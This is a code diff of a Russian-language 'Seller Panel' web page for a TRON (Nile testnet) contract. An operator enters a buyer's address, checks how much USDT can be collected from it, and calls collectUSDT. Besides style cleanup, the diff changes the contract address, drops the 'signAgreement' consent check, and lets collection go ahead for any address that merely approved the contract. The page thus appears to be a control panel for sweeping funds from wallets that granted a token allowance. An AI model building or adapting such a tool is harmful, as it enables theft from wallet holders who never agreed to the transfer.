@@ -29,8 +29,6 @@
             border-radius: 10px; display: flex; align-items: center; justify-content: center;
             font-weight: 800; font-size: 1.2rem;
         }
-        .logo-text h1 { font-size: 1.25rem; font-weight: 600; }
-        .logo-text span { font-size: 0.75rem; color: var(--text-secondary); }
         .wallet-status {
             display: flex; align-items: center; gap: 0.75rem;
             background: var(--bg-hover); padding: 0.5rem 1rem;
@@ -43,41 +41,24 @@
         }
         .wallet-status.connected .status-dot { background: var(--success); }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .wallet-address { font-family: monospace; font-size: 0.85rem; }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         .connect-warning {
             background: linear-gradient(135deg, rgba(255, 71, 87, 0.1) 0%, rgba(255, 165, 0, 0.1) 100%);
             border: 1px solid var(--error); border-radius: 16px;
             padding: 2rem; text-align: center; margin-bottom: 2rem;
         }
-        .connect-warning h2 { color: var(--error); margin-bottom: 1rem; }
         .btn-primary {
             background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
             color: white; border: none; padding: 1rem 2rem;
             border-radius: 12px; font-weight: 600; cursor: pointer;
             font-size: 1rem; display: inline-flex; align-items: center; gap: 0.5rem;
         }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3); }
         .spinner {
             width: 20px; height: 20px; border: 2px solid transparent;
             border-top-color: white; border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .stats-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 1.5rem; margin-bottom: 2rem;
-        }
-        .stat-card {
-            background: var(--bg-card); border: 1px solid var(--border);
-            border-radius: 16px; padding: 1.5rem;
-        }
-        .stat-card h3 {
-            font-size: 0.875rem; color: var(--text-secondary);
-            text-transform: uppercase; letter-spacing: 0.05em;
-            margin-bottom: 0.5rem;
-        }
-        .stat-value { font-size: 2rem; font-weight: 700; color: var(--accent); }
         .main-card {
             background: var(--bg-card); border: 1px solid var(--border);
             border-radius: 16px; padding: 2rem; margin-bottom: 2rem;
@@ -165,9 +146,9 @@
     <header class="header">
         <div class="logo">
             <div class="logo-icon">💰</div>
-            <div class="logo-text">
-                <h1>Панель Продавца</h1>
-                <span>Nile Testnet</span>
+            <div>
+                <h1 style="font-size: 1.25rem; font-weight: 600;">Панель Продавца</h1>
+                <span style="font-size: 0.75rem; color: var(--text-secondary);">Nile Testnet</span>
             </div>
         </div>
         <div class="wallet-status" id="walletStatus">
@@ -190,27 +171,16 @@
                 <div>
                     <div style="color: var(--text-secondary); font-size: 0.875rem;">Контракт:</div>
                 </div>
-                <div class="contract-address">TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV</div>
-            </div>
-
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <h3>Всего собрано</h3>
-                    <div class="stat-value" id="totalCollected">0 USDT</div>
-                </div>
-                <div class="stat-card">
-                    <h3>Проверок сегодня</h3>
-                    <div class="stat-value" id="checksToday">0</div>
-                </div>
+                <div class="contract-address">TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3</div>
             </div>
 
             <div class="main-card">
                 <h2>🔍 Проверка и сбор средств</h2>
 
                 <div class="form-group">
-                    <label>Адрес покупателя</label>
+                    <label>Адрес покупателя (начинается с T)</label>
                     <div class="input-group">
-                        <input type="text" id="userAddress" placeholder="TM... или TQ... (начинается с T)">
+                        <input type="text" id="userAddress" placeholder="Например: TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
                         <button class="btn-icon" onclick="pasteAddress()">📋</button>
                     </div>
                 </div>
@@ -229,8 +199,8 @@
 
                 <div class="user-info" id="userInfo">
                     <div class="info-row">
-                        <span style="color: var(--text-secondary);">Подписан:</span>
-                        <span id="signStatus"></span>
+                        <span style="color: var(--text-secondary);">Доступ разрешен:</span>
+                        <span id="approveStatus"></span>
                     </div>
                     <div class="info-row">
                         <span style="color: var(--text-secondary);">Собрано:</span>
@@ -254,14 +224,13 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV';
+        const CONTRACT_ADDRESS = 'TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3';
         const DEFAULT_USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
 
         const CONTRACT_ABI = [
-            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"name":"","type":"address"}],"name":"signed","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
         ];
@@ -329,11 +298,11 @@
             document.getElementById('checkBtnText').textContent = 'Проверка...';
 
             try {
-                const isSigned = await contract.signed(user).call();
+                const isApproved = await contract.approved(user).call();
                 const isCollected = await contract.collected(user).call();
                 const amount = await contract.checkCollectable(user, usdt).call();
 
-                document.getElementById('signStatus').innerHTML = isSigned 
+                document.getElementById('approveStatus').innerHTML = isApproved 
                     ? '<span class="badge badge-success">✅ Да</span>' 
                     : '<span class="badge badge-error">❌ Нет</span>';
                 document.getElementById('collectStatus').innerHTML = isCollected
@@ -343,7 +312,7 @@
 
                 document.getElementById('userInfo').classList.add('visible');
 
-                if (amount > 0 && !isCollected && isSigned) {
+                if (amount > 0 && !isCollected) {
                     document.getElementById('collectSection').style.display = 'block';
                     currentUserData = { user, usdt, amount };
                 } else {
